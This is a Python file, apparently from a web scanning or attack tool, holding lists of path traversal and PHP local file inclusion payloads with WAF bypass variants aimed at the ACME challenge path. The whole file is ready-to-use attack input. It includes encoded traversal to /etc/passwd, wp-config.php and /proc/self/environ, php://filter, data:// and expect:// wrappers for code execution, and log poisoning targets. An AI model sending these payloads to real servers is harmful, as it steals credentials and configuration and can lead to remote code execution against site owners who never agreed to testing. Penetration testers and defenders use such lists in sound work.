"""
Path Traversal and PHP LFI Payloads with WAF Bypass
"""

# 4. General path traversal payloads - from PayloadsAllTheThings
PATH_TRAVERSAL_PAYLOADS = [
    "/.well-known/acme-challenge/{token}/../../../etc/passwd",
    "/.well-known/acme-challenge/{token}/..%2f..%2f..%2fetc/passwd",
    "/.well-known/acme-challenge/{token}/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "/.well-known/acme-challenge/{token}/....//....//....//etc/passwd",
    "/.well-known/acme-challenge/{token}/.%2e/.%2e/.%2e/etc/passwd",
    "/.well-known/acme-challenge/{token}/%252e%252e/%252e%252e/etc/passwd",
    # Unicode encoding bypass
    "/.well-known/acme-challenge/{token}/..%c0%af../..%c0%af../etc/passwd",
    "/.well-known/acme-challenge/{token}/..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
    # Backslash variations
    "/.well-known/acme-challenge/{token}/..\\..\\..\\etc/passwd",
    "/.well-known/acme-challenge/{token}/..%5c..%5c..%5cetc/passwd",
]

# 2. PHP/LFI payloads - targeting common vulnerable endpoints  
PHP_LFI_PAYLOADS = [
    "/.well-known/acme-challenge/{token}/../../../etc/passwd",
    "/.well-known/acme-challenge/{token}/..%2f..%2f..%2fetc/passwd",
    "/.well-known/acme-challenge/{token}/%2e%2e/%2e%2e/etc/passwd",
    "/.well-known/acme-challenge/{token}/../../../var/log/apache2/access.log",
    "/.well-known/acme-challenge/{token}/../../../var/log/nginx/access.log",
    "/.well-known/acme-challenge/{token}/../../../proc/self/environ",
    "/.well-known/acme-challenge/{token}/../../../proc/self/cmdline",
    "/.well-known/acme-challenge/{token}/../wp-config.php",
    "/.well-known/acme-challenge/{token}/..;/wp-config.php",
    # PHP wrapper bypass
    "/.well-known/acme-challenge/{token}/../php://filter/convert.base64-encode/resource=../../../etc/passwd",
    "/.well-known/acme-challenge/{token}/../php://filter/read=convert.base64-encode/resource=/etc/passwd",
    # Double encoding bypass
    "/.well-known/acme-challenge/{token}/%252e%252e/%252e%252e/%252e%252e/etc/passwd",
    "/.well-known/acme-challenge/{token}/..%252f..%252f..%252f/etc/passwd",
    
    # ============================================
    # WAF BYPASS VARIATIONS FOR PHP/LFI
    # ============================================
    
    # Null byte injection (older PHP versions)
    "/.well-known/acme-challenge/{token}/../../../etc/passwd%00",
    "/.well-known/acme-challenge/{token}/../../../etc/passwd%00.html",
    "/.well-known/acme-challenge/{token}/../../../etc/passwd%00.jpg",
    
    # Unicode/UTF-8 bypass
    "/.well-known/acme-challenge/{token}/..%c0%af..%c0%af..%c0%af/etc/passwd",
    "/.well-known/acme-challenge/{token}/..%c1%9c..%c1%9c..%c1%9c/etc/passwd",
    "/.well-known/acme-challenge/{token}/..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f/etc/passwd",
    
    # Case manipulation
    "/.Well-Known/Acme-Challenge/{token}/../../../etc/passwd",
    "/.WELL-KNOWN/ACME-CHALLENGE/{token}/../../../etc/passwd",
    
    # Double dot variations
    "/.well-known/acme-challenge/{token}/....//....//....//etc/passwd",
    "/.well-known/acme-challenge/{token}/...//...//.../etc/passwd",
    "/.well-known/acme-challenge/{token}/..../..../..../etc/passwd",
    
    # Path normalization bypass
    "/.well-known/acme-challenge/{token}/./../.././../../etc/passwd",
    "/.well-known/acme-challenge/{token}/../.../../.../../etc/passwd",
    
    # PHP wrapper variations with WAF bypass
    "/.well-known/acme-challenge/{token}/../php://filter/convert.base64-encode/resource=../wp-config.php",
    "/.well-known/acme-challenge/{token}/../php://filter/read=string.rot13/resource=../../../etc/passwd",
    "/.well-known/acme-challenge/{token}/../PhP://filter/convert.base64-encode/resource=/etc/passwd",
    
    # Data wrapper
    "/.well-known/acme-challenge/{token}/../data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
    
    # Expect wrapper (RCE if enabled)
    "/.well-known/acme-challenge/{token}/../expect://id",
    "/.well-known/acme-challenge/{token}/../expect://whoami",
    
    # Phar wrapper
    "/.well-known/acme-challenge/{token}/../phar://uploads/evil.phar",
    
    # Windows paths
    "/.well-known/acme-challenge/{token}/../../../windows/win.ini",
    "/.well-known/acme-challenge/{token}/..\\..\\..\\windows\\win.ini",
    "/.well-known/acme-challenge/{token}/../../../boot.ini",
    
    # Log poisoning targets
    "/.well-known/acme-challenge/{token}/../../../var/log/apache2/error.log",
    "/.well-known/acme-challenge/{token}/../../../var/log/httpd/access_log",
    "/.well-known/acme-challenge/{token}/../../../var/log/auth.log",
    "/.well-known/acme-challenge/{token}/../../../var/mail/www-data",
    
    # Proc filesystem
    "/.well-known/acme-challenge/{token}/../../../proc/self/fd/0",
    "/.well-known/acme-challenge/{token}/../../../proc/self/status",
    "/.well-known/acme-challenge/{token}/../../../proc/version",
]
